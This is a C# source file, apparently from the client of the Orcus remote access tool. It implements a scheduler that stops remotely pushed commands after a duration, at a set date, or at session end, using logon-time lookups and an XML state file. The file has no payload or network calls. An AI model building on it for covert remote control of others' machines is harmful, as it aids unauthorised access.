using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Management;
using System.Threading;
using System.Xml.Serialization;
using Orcus.Config;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;

namespace Orcus.StaticCommandManagement
{
    public class ActiveCommandStopScheduler
    {
        private DynamicCommandStore _dynamicCommandStore;
        private DateTime? _upTime;
        private StopSchedulerSettings _stopSchedulerSettings;
        private string _settingsFilename = "schedulerInfo.xml";
        private readonly object _settingsLock = new object();

        public DateTime StartupTime
        {
            get
            {
                if (_upTime == null)
                {
                    _upTime = GetLogonDateTime();

                    if (_upTime == null)
                        using (var userPrincipal = UserPrincipal.Current)
                            _upTime = userPrincipal.LastLogon;

                    if (_upTime == null)
                        using (var uptime = new PerformanceCounter("System", "System Up Time"))
                        {
                            uptime.NextValue(); //Call this an extra time before reading its value
                            _upTime = DateTime.Now - TimeSpan.FromSeconds(uptime.NextValue());
                        }
                }

                return _upTime.GetValueOrDefault();
            }
        }

        private static DateTime? GetLogonDateTime()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_LogonSession"))
                {
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        try
                        {
                            return ManagementDateTimeConverter.ToDateTime((string)queryObj["StartTime"]);
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            return null;
        }

        public static DateTime? GetLastLogin()
        {
            using (var uc = UserPrincipal.Current)
                return uc.LastLogon;
        }

        public void Initialize(DynamicCommandStore dynamicCommandStore)
        {
            _dynamicCommandStore = dynamicCommandStore;

            var settingsFile = new FileInfo(Path.Combine(Consts.PotentialCommandsDirectory, _settingsFilename));
            if (settingsFile.Exists)
            {
                var xmls = new XmlSerializer(typeof(StopSchedulerSettings));

                try
                {
                    using (var fileStream = new FileStream(settingsFile.FullName, FileMode.Open, FileAccess.Read))
                        _stopSchedulerSettings = (StopSchedulerSettings)xmls.Deserialize(fileStream);
                }
                catch (Exception e)
                {
                    File.Delete(settingsFile.FullName);
                    _stopSchedulerSettings = new StopSchedulerSettings();
                }

                //clean file; remove all non existing commands
                lock (dynamicCommandStore.ListLock)
                {
                    for (int i = _stopSchedulerSettings.Sessions.Count - 1; i >= 0; i--)
                    {
                        var sessionInfo = _stopSchedulerSettings.Sessions[i];
                        if (dynamicCommandStore.StoredCommands.All(x => x.CallbackId != sessionInfo.CommandId))
                            _stopSchedulerSettings.Sessions.Remove(sessionInfo);
                    }

                    for (int i = _stopSchedulerSettings.DurationStopEventInfos.Count - 1; i >= 0; i--)
                    {
                        var durationStopEventInfo = _stopSchedulerSettings.DurationStopEventInfos[i];
                        if (dynamicCommandStore.StoredCommands.All(x => x.CallbackId != durationStopEventInfo.CommandId))
                            _stopSchedulerSettings.DurationStopEventInfos.Remove(durationStopEventInfo);
                    }
                }
            }
            else
                _stopSchedulerSettings = new StopSchedulerSettings();

            var directory = new DirectoryInfo(Consts.PotentialCommandsDirectory);
            if(directory.Exists)
            foreach (var file in directory.GetFiles("*.new"))
            {
                try
                {
                    file.Delete();
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }

        public void CommandManualStop(PotentialCommand potentialCommand)
        {
            lock (_settingsLock)
            {
                var session = _stopSchedulerSettings.Sessions.FirstOrDefault(x => x.CommandId == potentialCommand.CallbackId);
                if (session != null)
                {
                    _stopSchedulerSettings.Sessions.Remove(session);
                    SaveSchedulerSettings();
                }
            }
        }

        public void SaveSchedulerSettings()
        {
            var settingsFile = new FileInfo(Path.Combine(Consts.PotentialCommandsDirectory, _settingsFilename));
            var tempFile = settingsFile.FullName + ".new";

            var xmls = new XmlSerializer(typeof(StopSchedulerSettings));

            settingsFile.Directory.Create();

            try
            {
                using (var fileStream = new FileStream(tempFile, FileMode.Create, FileAccess.Write))
                    xmls.Serialize(fileStream, _stopSchedulerSettings);
            }
            catch (Exception)
            {
                File.Delete(tempFile);
                return;
            }

            File.Delete(settingsFile.FullName);
            File.Move(tempFile, settingsFile.FullName);
        }

        public bool ExecuteActiveCommand(PotentialCommand potentialCommand, ActiveStaticCommand activeStaticCommand)
        {
            if (potentialCommand.StopEvent == null)
                return true;

            lock (_settingsLock)
                switch (potentialCommand.StopEvent.Id)
                {
                    case 1: //DurationStopEvent
                        var sessionInfo =
                            _stopSchedulerSettings.Sessions.FirstOrDefault(
                                x => x.CommandId == potentialCommand.CallbackId);
                        var durationInfo =
                            _stopSchedulerSettings.DurationStopEventInfos.FirstOrDefault(
                                x => x.CommandId == potentialCommand.CallbackId);

                        var duration = TimeSpan.FromTicks(BitConverter.ToInt64(potentialCommand.StopEvent.Parameter, 0));

                        if (sessionInfo != null)
                        {
                            //if the difference is greater than 1 min. We dont directly compare because there might be a very small difference which comes from dividing the seconds in StartupTime
                            if (Math.Abs((StartupTime - sessionInfo.StartupTime).TotalSeconds) > 60)
                            {
                                //we dont execute this command again in a different session
                                _stopSchedulerSettings.Sessions.Remove(sessionInfo);
                                if (durationInfo != null)
                                    _stopSchedulerSettings.DurationStopEventInfos.Remove(durationInfo);

                                SaveSchedulerSettings();
                                _dynamicCommandStore.RemoveStoredCommand(potentialCommand);
                                return false;
                            }

                            if (durationInfo != null)
                            {
                                _stopSchedulerSettings.DurationStopEventInfos.Remove(durationInfo);
                                duration = DateTime.Now - durationInfo.StartTime;

                                if (duration < TimeSpan.Zero)
                                {
                                    _stopSchedulerSettings.Sessions.Remove(sessionInfo);
                                    SaveSchedulerSettings();
                                    _dynamicCommandStore.RemoveStoredCommand(potentialCommand);
                                    return false;
                                }
                            }
                        }
                        else
                            _stopSchedulerSettings.Sessions.Add(new SessionCommandInfo
                            {
                                CommandId = potentialCommand.CallbackId,
                                StartupTime = StartupTime
                            });

                        _stopSchedulerSettings.DurationStopEventInfos.Add(new DurationStopEventInfo
                        {
                            CommandId = potentialCommand.CallbackId,
                            StartTime = DateTime.Now
                        });

                        SaveSchedulerSettings();

                        new Timer(StopCommandCallback, activeStaticCommand, duration,
                            TimeSpan.FromMilliseconds(Timeout.Infinite));
                        return true;
                    case 2: //DateTimeStopEvent
                        var dateTime = DateTime.FromBinary(BitConverter.ToInt64(potentialCommand.StopEvent.Parameter, 0));
                        var timeSpan = dateTime - DateTime.UtcNow;
                        if (timeSpan < TimeSpan.Zero)
                        {
                            _dynamicCommandStore.RemoveStoredCommand(potentialCommand);
                            return false;
                        }

                        new Timer(StopAndRemoveCommandCallback,
                            new KeyValuePair<PotentialCommand, ActiveStaticCommand>(potentialCommand,
                                activeStaticCommand),
                            timeSpan, TimeSpan.FromMilliseconds(-1));
                        break;
                    case 3: //ShutdownStopEvent
                        sessionInfo =
                            _stopSchedulerSettings.Sessions.FirstOrDefault(
                                x => x.CommandId == potentialCommand.CallbackId);
                        if (sessionInfo != null)
                        {
                            //if the difference is greater than 1 min. We dont directly compare because there might be a very small difference which comes from dividing the seconds in StartupTime
                            if (Math.Abs((StartupTime - sessionInfo.StartupTime).TotalSeconds) > 60)
                            {
                                //we dont execute this command again in a different session
                                _stopSchedulerSettings.Sessions.Remove(sessionInfo);
                                SaveSchedulerSettings();
                                _dynamicCommandStore.RemoveStoredCommand(potentialCommand);
                                return false;
                            }
                        }
                        else
                        {
                            _stopSchedulerSettings.Sessions.Add(new SessionCommandInfo
                            {
                                CommandId = potentialCommand.CallbackId,
                                StartupTime = StartupTime
                            });
                            SaveSchedulerSettings();
                        }

                        return true;
                    default:
                        return true;
                }

            return true;
        }

        private void StopAndRemoveCommandCallback(object state)
        {
            var keyValuePair = (KeyValuePair<PotentialCommand, ActiveStaticCommand>) state;
            _dynamicCommandStore.RemoveStoredCommand(keyValuePair.Key);
            keyValuePair.Value.StopExecute();
        }

        private void StopCommandCallback(object state)
        {
            var activeCommand = (ActiveStaticCommand) state;
            activeCommand.StopExecute();
        }
    }
}